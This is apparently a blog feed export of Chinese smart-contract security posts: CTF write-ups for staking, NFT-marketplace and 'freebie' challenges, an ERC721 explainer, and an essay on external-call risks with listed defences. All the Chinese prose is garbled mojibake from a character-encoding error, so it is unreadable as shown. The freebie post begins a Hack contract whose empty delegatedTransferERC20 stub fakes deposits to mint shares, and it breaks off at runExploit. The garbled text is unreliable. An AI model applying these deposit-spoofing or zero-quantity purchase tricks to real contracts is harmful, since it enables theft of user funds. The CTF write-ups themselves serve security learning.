ï¼Œå’Œä¹‹å‰çš„è´¨æŠ¼åˆçº¦å¾ˆåƒï¼Œå­˜æ¬¾è·å¾—å¥–åŠ±ï¼Œè€Œæˆ‘ä»¬å°±æ˜¯è¦è·å¾—è¿™ä¸ªMdsterChefåˆçº¦ä¸­å…¨éƒ¨çš„å¥–åŠ±ï¼Œçœ‹åˆ°é¢˜ç›®è¯´æœ‰5%çš„æ‰‹ç»­è´¹ï¼Œåˆæ­¥æƒ³æ³•å°±æ˜¯ä¼šä¸ä¼šæ˜¯æº¢å‡ºå•¥çš„ï¼Œä½†æ˜¯çœ‹åˆ°å­˜å–ä»£ç æ—¶ï¼Œæˆ‘å¹¶æ²¡æœ‰çœ‹è§æœ‰å¯¹5%çš„æ‰‹ç»­è´¹çš„è¯´æ˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//_pidæ˜¯æµåŠ¨æ± çš„ID</span><br><span class="line"> function deposit(uint256 _pid, uint256 _amount) public &#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line">        UserInfo storage user = userInfo[_pid][msg.sender];</span><br><span class="line">        updatePool(_pid);</span><br><span class="line">        if (user.amount &gt; 0) &#123;</span><br><span class="line">            uint256 pending =</span><br><span class="line">                user.amount.mul(pool.accMunyPerShare).div(1e12).sub(</span><br><span class="line">                    user.rewardDebt</span><br><span class="line">                );</span><br><span class="line">            safeMunyTransfer(msg.sender, pending);</span><br><span class="line">        &#125;</span><br><span class="line">        pool.lpToken.safeTransferFrom(</span><br><span class="line">            address(msg.sender),</span><br><span class="line">            address(this),</span><br><span class="line">            _amount</span><br><span class="line">        );</span><br><span class="line">        user.amount = user.amount.add(_amount);</span><br><span class="line">        user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);</span><br><span class="line">        emit Deposit(msg.sender, _pid, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Withdraw LP tokens from MasterChef.</span><br><span class="line">    function withdraw(uint256 _pid, uint256 _amount) public &#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line">        UserInfo storage user = userInfo[_pid][msg.sender];</span><br><span class="line">        require(user.amount &gt;= _amount, &quot;withdraw: not good&quot;);</span><br><span class="line">        updatePool(_pid);</span><br><span class="line">        uint256 pending =</span><br><span class="line">            user.amount.mul(pool.accMunyPerShare).div(1e12).sub(</span><br><span class="line">                user.rewardDebt</span><br><span class="line">            );</span><br><span class="line">        safeMunyTransfer(msg.sender, pending);</span><br><span class="line">        user.amount = user.amount.sub(_amount);</span><br><span class="line">        user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);</span><br><span class="line">        pool.lpToken.safeTransfer(address(msg.sender), _amount);</span><br><span class="line">        emit Withdraw(msg.sender, _pid, _amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±å¯ä»¥æ‰§è¡Œå¾ªç¯å­˜å–æ¬¾ï¼Œï¼ˆé¢˜ç›®ä¹Ÿè¯´äº†æˆ‘ä»¬æœ‰10,000 MULAï¼‰ï¼Œè·å¾—å¥–åŠ±</p><p>æ”»å‡»æ€è·¯ï¼šå°±æ˜¯é€šè¿‡å¾ªç¯å­˜å–æ¬¾ï¼Œè·å¾—å¥–åŠ±ï¼ˆæ³¨æ„ï¼Œå› ä¸ºMulaTokenåˆçº¦ä¸­æœ‰è‡ªå¸¦çš„æŸå¤±5%ï¼Œæ‰€ä»¥æœ€åæ”»å‡»è€…è¿˜æ˜¯çš„æŸå¤±ä»£å¸ï¼Œä¸è¿‡æ˜¯é¢˜ç›®åˆå§‹çš„ï¼Œå¹¶ä¸ç”¨æ‹…å¿ƒï¼‰</p><p>å…¶ä»–çš„ä¸ç”¨å»çº ç»“é‚£ä¹ˆå¤šï¼Œå°±æ˜¯è€ƒå¯Ÿè¿™ä¸ªè´§å¸æœ‰æ²¡æœ‰é€šè´§ç´§ç¼©ä»£å¸æ”¯æŒ</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC721</title>
      <link href="/2024/10/25/ERC721/"/>
      <url>/2024/10/25/ERC721/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h1><p>éåŒè´¨ä»£å¸æ ‡å‡†</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰ç”¨äºä»¥å”¯ä¸€çš„æ–¹å¼æ ‡è¯†æŸäººæˆ–è€…æŸç‰©ã€‚ æ­¤ç±»å‹çš„ä»£å¸å¯ä»¥è¢«å®Œç¾åœ°ç”¨äºå‡ºå”®ä¸‹åˆ—ç‰©å“çš„å¹³å°ï¼šæ”¶è—å“ã€å¯†é’¥ã€å½©ç¥¨ã€éŸ³ä¹ä¼šåº§ä½ç¼–å·ã€ä½“è‚²æ¯”èµ›ç­‰ã€‚ è¿™ç§ç±»å‹çš„ä»£å¸æœ‰ç€æƒŠäººçš„æ½œåŠ›ï¼Œå› æ­¤å®ƒéœ€è¦ä¸€ä¸ªé€‚å½“çš„æ ‡å‡†ã€‚ERC-721 å°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜è€Œæ¥ï¼</p><p>ERC-721 ä¸º NFT å¼•å…¥äº†ä¸€ä¸ªæ ‡å‡†ï¼Œæ¢è¨€ä¹‹ï¼Œè¿™ç§ç±»å‹çš„ä»£å¸æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œå¹¶ä¸”å¯èƒ½ä¸æ¥è‡ªåŒä¸€æ™ºèƒ½åˆçº¦çš„å¦ä¸€ä»£å¸æœ‰ä¸åŒçš„ä»·å€¼ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºå®ƒçš„å¹´ä»½ã€ç¨€æœ‰æ€§ã€ç”šè‡³æ˜¯å®ƒçš„è§‚æ„Ÿã€‚</p><p>æ˜¯çš„ã€‚ æ‰€æœ‰ NFTs éƒ½æœ‰ä¸€ä¸ª uint256 å˜é‡ï¼Œåä¸º tokenIdï¼Œæ‰€ä»¥å¯¹äºä»»ä½• ERC-721 åˆçº¦ï¼Œè¿™å¯¹å€¼contract address, tokenId å¿…é¡»æ˜¯å…¨å±€å”¯ä¸€çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºå¯ä»¥æœ‰ä¸€ä¸ªâ€œè½¬æ¢å™¨â€ï¼Œ ä½¿ç”¨ tokenId ä½œä¸ºè¾“å…¥å¹¶è¾“å‡ºä¸€äº›å¾ˆé…·çš„äº‹ç‰©å›¾åƒï¼Œä¾‹å¦‚åƒµå°¸ã€æ­¦å™¨ã€æŠ€èƒ½æˆ–ç¥å¥‡çš„å°çŒ«å’ªï¼</p><h2 id="ä¸»è¦åŠŸèƒ½"><a href="#ä¸»è¦åŠŸèƒ½" class="headerlink" title="ä¸»è¦åŠŸèƒ½"></a>ä¸»è¦åŠŸèƒ½</h2><p>åè®®å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function balanceOf(address _owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">function ownerOf(uint256 _tokenId) external view returns (address);</span><br><span class="line">//æ³¨æ„å‘é€çš„tokenidï¼Œæ²¡æœ‰æ•°é‡</span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br><span class="line"></span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function approve(address _approved, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function setApprovalForAll(address _operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">function getApproved(uint256 _tokenId) external view returns (address);</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼š<br>balanceOf(): è¿”å›ç”±_owner æŒæœ‰çš„NFTsçš„æ•°é‡ã€‚</p><p>ownerOf(): è¿”å›tokenIdä»£å¸æŒæœ‰è€…çš„åœ°å€ã€‚</p><p>approve(): æˆäºˆåœ°å€_toå…·æœ‰_tokenIdçš„æ§åˆ¶æƒï¼Œæ–¹æ³•æˆåŠŸåéœ€è§¦å‘Approval äº‹ä»¶ã€‚</p><p>setApprovalForAll(): æˆäºˆåœ°å€_operatorå…·æœ‰æ‰€æœ‰NFTsçš„æ§åˆ¶æƒï¼ŒæˆåŠŸåéœ€è§¦å‘ApprovalForAlläº‹ä»¶ã€‚</p><p>getApproved()ã€isApprovedForAll(): ç”¨æ¥æŸ¥è¯¢æˆæƒã€‚</p><p>safeTransferFrom(): è½¬ç§»NFTæ‰€æœ‰æƒï¼Œä¸€æ¬¡æˆåŠŸçš„è½¬ç§»æ“ä½œå¿…é¡»å‘èµ· Transer äº‹ä»¶ã€‚å‡½æ•°çš„å®ç°éœ€è¦åšä¸€ä¸‹å‡ ç§æ£€æŸ¥ï¼š</p><ul><li>è°ƒç”¨è€…msg.senderåº”è¯¥æ˜¯å½“å‰tokenIdçš„æ‰€æœ‰è€…æˆ–è¢«æˆæƒçš„åœ°å€</li><li>_from å¿…é¡»æ˜¯ _tokenIdçš„æ‰€æœ‰è€…</li><li>_tokenId åº”è¯¥æ˜¯å½“å‰åˆçº¦æ­£åœ¨ç›‘æµ‹çš„NFTs ä¸­çš„ä»»ä½•ä¸€ä¸ª</li><li>_to åœ°å€ä¸åº”è¯¥ä¸º 0ï¼Œå¦‚æœ_to æ˜¯ä¸€ä¸ªåˆçº¦åº”è¯¥è°ƒç”¨å…¶onERC721Receivedæ–¹æ³•, å¹¶ä¸”æ£€æŸ¥å…¶è¿”å›å€¼ï¼Œå¦‚æœè¿”å›å€¼ä¸ä¸ºbytes4(keccak256(â€œonERC721Received(address,uint256,bytes)â€))æŠ›å‡ºå¼‚å¸¸ã€‚<br>ä¸€ä¸ªå¯æ¥æ”¶NFTçš„åˆçº¦å¿…é¡»å®ç°ERC721TokenReceiveræ¥å£ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface ERC721TokenReceiver &#123;</span><br><span class="line">    /// @return `bytes4(keccak256(&quot;onERC721Received(address,uint256,bytes)&quot;))`</span><br><span class="line">    function onERC721Received(address _from, uint256 _tokenId, bytes data) external returns(bytes4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>transferFrom(): ç”¨æ¥è½¬ç§»NFTs, æ–¹æ³•æˆåŠŸåéœ€è§¦å‘Transferäº‹ä»¶ã€‚è°ƒç”¨è€…è‡ªå·±ç¡®è®¤_toåœ°å€èƒ½æ­£å¸¸æ¥æ”¶NFTï¼Œå¦åˆ™å°†ä¸¢å¤±æ­¤NFTã€‚æ­¤å‡½æ•°å®ç°æ—¶éœ€è¦æ£€æŸ¥ä¸Šé¢æ¡ä»¶çš„å‰4æ¡ã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> åè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-nft-bonanza</title>
      <link href="/2024/10/25/CTF-nft-bonanza/"/>
      <url>/2024/10/25/CTF-nft-bonanza/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-ntf-bonanza"><a href="#CTF-ntf-bonanza" class="headerlink" title="CTF-ntf-bonanza"></a>CTF-ntf-bonanza</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/nft-bonanza">ç‚¹å‡»</a></p><p>è¦æ±‚æ˜¯ï¼šæ–°çš„ NFT äº¤æ˜“åˆçº¦ BonanzaMarketplace å·²ç»æ¨å‡ºï¼Œå®ƒå…è®¸äº¤æ˜“é€‰å®šçš„ç™½åå• ERC721 å’Œ ERC1155 ä»£å¸ã€‚æ‚¨çš„æŒ‘æˆ˜æ˜¯è·å¾—æ‰€æœ‰åˆ—å‡ºçš„ NFTã€‚</p><p>æ ¹æ®æºç ï¼Œå¯ä»¥å‘ç°æ­¤æ—¶çš„NTFéƒ½æ˜¯ERC721ä»£å¸ï¼Œæ‰€ä»¥äº†è§£ERC721éåŒè´¨åŒ–ä»£å¸æ ‡å‡†ï¼Œä¼šå¾ˆå¥½çš„ç†è§£ã€‚</p><p>è¦è·å¾—æ‰€åˆ—çš„NTFï¼Œå°±å…ˆçœ‹çœ‹ï¼ŒbuyItemå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buyItem(</span><br><span class="line">       address _nftAddress,</span><br><span class="line">       uint256 _tokenId,</span><br><span class="line">       address _owner,</span><br><span class="line">       uint256 _quantity</span><br><span class="line">   )</span><br><span class="line">       external</span><br><span class="line">       nonReentrant</span><br><span class="line">       isListed(_nftAddress, _tokenId, _owner)</span><br><span class="line">       validListing(_nftAddress, _tokenId, _owner)</span><br><span class="line">   &#123;</span><br><span class="line">       require(_msgSender() != _owner, &quot;Cannot buy your own item&quot;);</span><br><span class="line"></span><br><span class="line">       Listing memory listedItem = listings[_nftAddress][_tokenId][_owner];</span><br><span class="line">       require(listedItem.quantity &gt;= _quantity, &quot;not enough quantity&quot;);</span><br><span class="line"></span><br><span class="line">       // Transfer NFT to buyer</span><br><span class="line">       if (IERC165(_nftAddress).supportsInterface(INTERFACE_ID_ERC721)) &#123;</span><br><span class="line">           IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           IERC1155(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId, _quantity, bytes(&quot;&quot;));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (listedItem.quantity == _quantity) &#123;</span><br><span class="line">           delete (listings[_nftAddress][_tokenId][_owner]);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           listings[_nftAddress][_tokenId][_owner].quantity -= _quantity;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       emit ItemSold(</span><br><span class="line">           _owner,</span><br><span class="line">           _msgSender(),</span><br><span class="line">           _nftAddress,</span><br><span class="line">           _tokenId,</span><br><span class="line">           _quantity,</span><br><span class="line">           listedItem.pricePerItem</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       _buyItem(listedItem.pricePerItem, _quantity, _owner);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function _buyItem(</span><br><span class="line">       uint256 _pricePerItem,</span><br><span class="line">       uint256 _quantity,</span><br><span class="line">       address _owner</span><br><span class="line">   ) internal &#123;</span><br><span class="line">       uint256 totalPrice = _pricePerItem * _quantity;</span><br><span class="line">       uint256 feeAmount = totalPrice * fee / BASIS_POINTS;</span><br><span class="line">       IERC20(paymentToken).safeTransferFrom(_msgSender(), feeReceipient, feeAmount);</span><br><span class="line">       IERC20(paymentToken).safeTransferFrom(_msgSender(), _owner, totalPrice - feeAmount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¹¶æ²¡æœ‰å¯¹è´­ä¹°æ•°é‡quantityçš„æ£€æŸ¥ï¼Œæ‰€ä»¥å³ä½¿è´­ä¹°é›¶ä¸ªNTFä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé‡ç‚¹æ¥äº†ï¼Œåœ¨ERC721ä»£å¸æ ‡å‡†ä¸­ï¼Œå¯¹äºè´­ä¹°æ•°é‡å¹¶æ²¡æœ‰è¦æ±‚ï¼Œè¿˜æ˜¯ä¼šå‘é€tokenIdç»™è´­ä¹°è€…ï¼Œè¿™å°±æ˜¯æ¼æ´æ‰€åœ¨</p><p>æ”»å‡»æ€è·¯ï¼šç›´æ¥è°ƒç”¨buyItemå‡½æ•°ï¼Œè´­ä¹°é›¶ä¸ªERC721ä»£å¸æ ‡å‡†çš„NTFå°±å¯ä»¥äº†</p><p>ä¸ªäººè®¤ä¸ºï¼Œè¿™ä¸ªé¢˜å°±æ˜¯ç–å¿½äº†ERC721ä»£å¸çš„æ‰§è¡Œæ ‡å‡†ï¼Œæ‰€ä»¥å¯¹äºä¸€äº›ä¸»æµåè®®ï¼Œè¿˜æ˜¯å¿…é¡»çš„äº†è§£ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯æ€•çš„å¤–éƒ¨è°ƒç”¨ï¼Ÿ</title>
      <link href="/2024/10/25/%E5%8F%AF%E6%80%95%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%EF%BC%9F/"/>
      <url>/2024/10/25/%E5%8F%AF%E6%80%95%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>å¾€å¾€å¯¹äºä¸€ä¸ªåŠŸèƒ½æˆç†Ÿçš„<code>DAPP</code>ï¼Œå¦‚uniswapV2,å¤šç­¾é’±åŒ…ç­‰ï¼Œéƒ½æ˜¯é€šè¿‡å¤šä¸ªæ™ºèƒ½åˆçº¦å®ç°çš„ï¼Œé‚£ä¹ˆå°±å¤šå¤šå°‘å°‘éƒ½ä¼šæ¶‰åŠåˆ°å¤–éƒ¨çš„è°ƒç”¨ï¼Œç„¶è€Œè¿™å°±å¸¦æ¥çš„å¾ˆå¤§çš„é£é™©ã€‚å¦‚æœä¸èƒ½ç¡®ä¿å¤–éƒ¨è°ƒç”¨çš„åˆçº¦æ˜¯æ­£å¸¸ä¸”ä¸å¸¦æ¶æ„é€»è¾‘ä»£ç ï¼Œé‚£ä¹ˆå¯¹è‡ªèº«åˆçº¦å°±æ˜¯ä¸ªå®šæ—¶ç‚¸å¼¹ï¼Œä¸çŸ¥é“å“ªå¤©å°±è°ƒç”¨äº†ä¸€ä¸ªä¸æ­£å¸¸çš„æ¶æ„åˆçº¦ï¼Œå¼•çˆ†ç‚¸å¼¹ã€‚</p><p>å¤–éƒ¨è°ƒç”¨ä¼šå¼•å‘çš„ä¸€äº›å¸¸è§æ¼æ´ï¼šé‡å…¥æ”»å‡»ï¼Œå¤–éƒ¨åˆçº¦çš„å®‰å…¨æ€§é—®é¢˜ï¼Œé‡æ”¾æ”»å‡»ç­‰</p><p>å…·ä½“æ¥çœ‹ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(</span><br><span class="line">       uint256 farmDeposit,</span><br><span class="line">       address payable from,</span><br><span class="line">       address to</span><br><span class="line">   ) external returns (uint256 shares) &#123;</span><br><span class="line">       require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);</span><br><span class="line">       require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);</span><br><span class="line">       require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);</span><br><span class="line"></span><br><span class="line">       shares = farmDeposit;</span><br><span class="line">       if (xfarm.totalSupply() != 0) &#123;</span><br><span class="line">           uint256 farmBalance = farm.balanceOf(address(this));</span><br><span class="line">           shares = (shares * xfarm.totalSupply()) / farmBalance;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (isContract(from)) &#123;</span><br><span class="line">           require(IAdvisor(from).owner() == msg.sender); // admin</span><br><span class="line">           IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           require(from == msg.sender); // user</span><br><span class="line">           farm.safeTransferFrom(from, address(this), farmDeposit);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       xfarm.mint(to, shares);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªè´¨æŠ¼åˆçº¦ RewardsAdvisorä¸­çš„éƒ¨åˆ†ä»£ç ï¼Œå®ƒæ¥å— FARM ä»£å¸å¹¶é“¸é€ ç­‰é‡çš„ xFARMã€‚xFARM ç”¨äºæ²»ç†defi ç”Ÿæ€ç³»ç»Ÿã€‚<br>é€šè¿‡ä»¥ä¸Šä»£ç ã€‚æˆ‘ä»¬å‘ç°å½“è´¨æŠ¼åˆçº¦æ¥å—xFARMæ—¶ï¼Œå¦‚æœå¯¹é¢æ˜¯åˆçº¦Aï¼Œä¸æ˜¯å¤–éƒ¨è´¦æˆ·ï¼Œé‚£ä¹ˆè´¨æŠ¼åˆçº¦å°±ä¼šè°ƒç”¨è¿™ä¸ªåˆçº¦Açš„delegatedTransferERC20ï¼Œæ¥è¿›è¡Œä»£å¸çš„è½¬ç§»ï¼Œå¯æ˜¯ï¼Œè´¨æŠ¼åˆçº¦å¹¶æ²¡æœ‰å¯¹è½¬ç§»åä»£å¸æ•°é‡çš„æ£€æŸ¥ç­‰ï¼Œæ‰€ä»¥ï¼Œåˆçº¦Aä¸­delegatedTransferERC20å‡½æ•°å¦‚æœä»€ä¹ˆä¹Ÿæ²¡æœ‰å®ç°ï¼Œè´¨æŠ¼åˆçº¦ä¹Ÿä¼šè®¤ä¸ºä»£å¸æ¥å—æˆåŠŸäº†ï¼Œè¿™å°†ä¼šå¼•èµ·ä¸€ä¸ªå¯æ€•çš„åæœã€‚</p><p>åŒæ ·ã€‚ä¹Ÿæœ‰ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function stakeFor(address _for, uint256 _amount) public &#123;</span><br><span class="line">    require(_amount &gt; 0, &quot;Cannot stake 0&quot;);</span><br><span class="line">    </span><br><span class="line">    // pull tokens and apply stake</span><br><span class="line">    stakingToken.safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    _applyStake(_for, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯ä¸€ä¸ªè´¨æŠ¼åˆçº¦ä¸­çš„éƒ¨åˆ†ä»£ç ï¼Œè¿›è¡Œå¤–éƒ¨è°ƒç”¨  <code>stakingToken.safeTransferFrom(msg.sender, address(this))</code>,éƒ½æ˜¯æ²¡æœ‰å¯¹è°ƒç”¨åè¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä¹˜è™šè€Œå…¥ï¼Œå¦‚ï¼šTempleDAO çš„ STAX åœ¨2022å¹´å°±å› ä¸ºåŒæ ·çš„åŸå› è¢«é»‘å®¢å…¥ä¾µï¼ŒæŸå¤±äº†ä»·å€¼çº¦ $2.3M çš„ LP ä»£å¸ã€‚å†è€…å°±æ˜¯Visoråˆçº¦(å®ç°é“¸é€ æ— é™å¥–åŠ±)ï¼Œé»‘å®¢é€šè¿‡åˆ©ç”¨åŒæ ·çš„åŸç†å®ç°äº†ç»æµå¥—åˆ©ï¼Œé“¸é€ äº† 195k ä¸ª vVISR ä»£å¸ã€‚ç„¶åï¼Œè¿™äº›è¢«<code>burn</code>ä¸º 8.8M VISRï¼Œé€šè¿‡ Uniswap v2 äº¤æ¢ä¸º ETHï¼Œè·å¾—äº†113 ETHï¼ˆ450 ç¾å…ƒï¼‰ã€‚<a href="https://rekt.news/templedao-rekt/">æ¡ˆä¾‹1å‚è€ƒ</a> <a href="https://rekt.news/visor-finance-rekt/">æ¡ˆä¾‹2å‚è€ƒ</a></p><p>ä½†æ˜¯ï¼Œå¤–éƒ¨è°ƒç”¨å¹¶ä¸å¯æ€•ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æªæ–½æ¥é˜²èŒƒï¼š<br>1ï¼Œä½¿ç”¨çŠ¶æ€å˜é‡æ§åˆ¶ï¼Œåœ¨æ‰§è¡Œå¤–éƒ¨è°ƒç”¨ä¹‹å‰å…ˆæ›´æ–°åˆçº¦çŠ¶æ€ï¼Œé˜²æ­¢é‡å…¥æ”»å‡»ã€‚<br>2ï¼Œé‡‡ç”¨æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼ï¼Œå°†åˆçº¦æ“ä½œåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œç¡®ä¿åœ¨å¤–éƒ¨è°ƒç”¨å‰å®Œæˆæ‰€æœ‰çŠ¶æ€æ›´æ–°ã€‚<br>3ï¼Œå®ç°é‡å…¥ä¿æŠ¤ï¼Œä½¿ç”¨äº’æ–¥é”ï¼ˆä¾‹å¦‚ nonReentrant ä¿®é¥°ç¬¦ï¼‰æ¥é˜²æ­¢é‡å…¥æ”»å‡»ã€‚<br>4ï¼Œé€šè¿‡æƒé™æ§åˆ¶ï¼Œç¡®ä¿åªæœ‰ç»è¿‡æˆæƒçš„ç”¨æˆ·å¯ä»¥æ‰§è¡Œç‰¹å®šæ“ä½œï¼Œä½¿ç”¨ Ownable æˆ–ç±»ä¼¼çš„åº“æ¥ç®¡ç†æƒé™ã€‚<br>5ï¼Œä½¿ç”¨å—ä¿¡ä»»çš„å¤–éƒ¨åˆçº¦ï¼Œåœ¨ä¸å…¶ä»–åˆçº¦äº¤äº’æ—¶ï¼Œç¡®ä¿åªä¸ä¿¡èª‰è‰¯å¥½çš„åˆçº¦äº¤äº’ï¼Œé¿å…ä¸å¿…è¦çš„é£é™©ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-freebie</title>
      <link href="/2024/10/24/CTF-freebie/"/>
      <url>/2024/10/24/CTF-freebie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-freebie"><a href="#CTF-freebie" class="headerlink" title="CTF-freebie"></a>CTF-freebie</h1><p> é¢˜ç›®æºç <a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/freebie">ç‚¹å‡»</a></p><p> è¿™é“é¢˜ï¼Œæ€ä¹ˆè¯´ï¼Œå’Œæ˜¨å¤©å†™çš„é‚£ä¸ª<a href="CTF-tasty-stake.md">CTF-tasty-stake</a>çš„æ¼æ´åŸç†ä¸€æ ·</p><p> çœ‹åˆ°è¿™æ®µä»£ç ï¼Œç»å…¸çš„å§”æ‰˜è°ƒç”¨ï¼Œåªä¸è¿‡è¿™æ¬¡åˆæ˜¯ä¸å®ç°å®ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(</span><br><span class="line">        uint256 farmDeposit,</span><br><span class="line">        address payable from,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256 shares) &#123;</span><br><span class="line">        require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);</span><br><span class="line">        require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);</span><br><span class="line">        require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);</span><br><span class="line"></span><br><span class="line">        shares = farmDeposit;</span><br><span class="line">        if (xfarm.totalSupply() != 0) &#123;</span><br><span class="line">            uint256 farmBalance = farm.balanceOf(address(this));</span><br><span class="line">            shares = (shares * xfarm.totalSupply()) / farmBalance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (isContract(from)) &#123;</span><br><span class="line">            require(IAdvisor(from).owner() == msg.sender); // admin</span><br><span class="line">            IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            require(from == msg.sender); // user</span><br><span class="line">            farm.safeTransferFrom(from, address(this), farmDeposit);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        xfarm.mint(to, shares);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å®ç°çš„æ˜¯å­˜æ¬¾åˆçº¦ï¼Œå­˜å…¥ä»£å¸åï¼Œå°±å¯ä»¥è·å¾—è‚¡ä»½ï¼Œå­˜å…¥è¶Šå¤šï¼Œè·å¾—çš„å°±è¶Šå¤šã€‚</p><p>ç„¶è€Œåˆæ˜¯ä¸€ä¸ªå¯¹å¤–éƒ¨è°ƒç”¨ï¼Œæ²¡æœ‰æ£€æŸ¥ã€‚</p><p>æ”»å‡»åˆçº¦å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IRewardsAdvisor &#123;</span><br><span class="line">    function withdraw(</span><br><span class="line">        uint256 shares,</span><br><span class="line">        address to,</span><br><span class="line">        address payable from</span><br><span class="line">    ) external returns (uint256 rewards);</span><br><span class="line"></span><br><span class="line">    function deposit(</span><br><span class="line">        uint256 farmDeposit,</span><br><span class="line">        address payable from,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256 shares);</span><br><span class="line">&#125;</span><br><span class="line">contract Hack&#123;</span><br><span class="line"></span><br><span class="line">    IRewardsAdvisor rewardsAdvisor;</span><br><span class="line"></span><br><span class="line">    constructor(address _rewardsAdvisor) &#123;</span><br><span class="line">        rewardsAdvisor = IRewardsAdvisor(_rewardsAdvisor);</span><br><span class="line">    &#125;</span><br><span class="line">  //ä¸å®ç°è¿™ä¸ªåŠŸèƒ½--æ¬ºéª—</span><br><span class="line">    function delegatedTransferERC20(address token, address to, uint256 amount) external &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function runExploit() external 